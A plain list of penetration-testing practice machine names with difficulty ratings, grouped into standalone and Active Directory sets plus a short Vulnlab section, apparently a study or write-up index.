- SolidState (Medium)
- Bounty (Easy) 
- Support (Easy)
- UpDown (Medium)
- Tabby (Easy)
- Soccer (Easy)
- Busqueda (Easy)
- Aero (Medium)
- Intentions (Hard)
- Broker (Easy)
- ChatterBox (Easy)
- Pilgrimage (Easy)
- Sau (Easy)
- Querier (Medium)
- Keeper (Easy)
- Builder (Medium)
- Giddy (Medium)
- CozyHosting (Easy)
- SwagShop (Easy)
- Manager (Medium)
- OpenAdmin (Easy)
- Monitored (Medium)
- Usage (Easy)
- Mailing (Easy)
- Nineveh (Medium)
- BoardLight (Easy)
- Editorial (Easy)
- Remote (Easy)
- Buff (Easy)
- LinkVortex (Easy)
- Analytics (Easy)
- UnderPass (Easy)
- Codify (Easy)
- Dog (Easy)
- Editor (Easy)
- Outbound (Easy)
- Browsed (Medium)


Active Directory

- Active (Easy)
- Forest (Easy)
- Sauna (Easy)
- Monteverde (Medium)
- Timelapse (Easy)
- Return (Easy)
- Cascade (Medium)
- Flight (Hard)
- Blackfield (Hard)
- Cicada (Easy)
- Escape (Easy)
- TheFrizz (Medium)
- Fluffy (Easy)
- TombWatcher - (Medium)
- Puppy (Medium)
- Signed (Medium)
- Eighteen (Easy)
- EscapeTwo (Easy
- DarkZero (Hard)
- Authority (Medium)
- Rebound (Insane)
- Absolute (Insane)
- Administrator (Medium)
- Certified (Medium)
- Rustkey (Hard)



**Vulnlab**

Stand Alone Machines

Active Directory

- Baby (Easy)
- BabyTwo (Medium)
- Breach (Medum)
- Sweep (Medium)
- Sendai (Medium)
- Voleur (Medium)
